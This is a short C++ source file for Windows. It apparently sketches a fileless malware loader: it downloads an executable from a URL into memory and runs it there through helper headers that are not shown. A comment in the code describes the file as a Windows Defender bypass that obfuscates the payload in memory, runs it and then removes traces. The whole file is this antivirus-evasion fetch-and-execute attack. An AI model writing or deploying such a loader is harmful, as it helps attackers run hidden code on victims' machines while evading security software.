#include <Windows.h>
#include <iostream>
#include <cstring>

#include "memory.h"
#include "internet.h"

BOOL loadFileFromMemory(const char* internet_address) {
    INTERNETCLIENT internet;
    
    if(!memory::runExecutable((char *)internet.getBytes(internet_address)))
        return false;
    
    return true;
}

int main(){
   std::cout << "Loading file..." << std::endl; 
    
   /* 
        We decide to load the file from memory and obfuscate it as we go.
        -----------------------------------------------------------------
        
        Please note: this will not work on any linux system, its a windows
        defender bypass you noodle.
        
        - Downloads file into memory
        - Obfuscate file and move to seperate space in memory
        - Proceed to run file and then remove traces
   */
   loadFileFromMemory("http://127.0.0.1/file.exe");
   
   return 1;
}
